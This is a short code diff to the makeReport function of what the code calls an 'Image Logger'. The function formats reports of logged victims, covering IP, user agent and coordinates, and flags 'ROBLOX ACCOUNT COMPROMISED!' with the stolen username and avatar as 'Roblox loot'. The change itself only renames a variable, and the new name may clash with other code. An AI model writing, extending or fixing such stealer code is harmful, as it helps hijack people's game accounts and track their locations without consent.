@@ -222,7 +222,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 }
     
     if roblox_data:
-        embed_desc += f"""
+        embed += f"""
 
 🟥 **ROBLOX ACCOUNT COMPROMISED!**
 > **Username:** `{roblox_data['username']}`
@@ -238,7 +238,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
         "embeds": [{
             "title": "Image Logger - Victim Logged!" if not roblox_data else "🟥 ROBLOX + Image Logger Hit!",
             "color": 0xFF0000 if roblox_data else config["color"],  # Red for Roblox loot
-            "description": embed_desc,
+            "description": embed,
             "thumbnail": {"url": roblox_data['avatar']} if roblox_data else None,
             "timestamp": requests.get("https://worldtimeapi.org/api/timezone/UTC").json().get("utc_datetime", "")
         }]
